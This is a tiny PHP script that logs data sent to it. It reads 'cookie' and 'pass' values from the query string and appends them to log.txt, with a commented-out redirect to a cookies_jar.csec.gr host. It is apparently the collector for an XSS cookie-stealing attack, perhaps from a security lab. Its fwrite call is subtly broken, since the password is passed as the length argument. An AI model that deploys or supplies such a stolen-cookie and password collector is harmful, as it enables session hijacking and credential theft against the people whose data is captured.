<?php
//header ('Location:http://cookies_jar.csec.gr/');
$cookies = $_GET["cookie"];
$file = fopen('log.txt', 'a');
$password = $_GET["pass"];
fwrite($file, $cookies, $password . "\n\n");
?>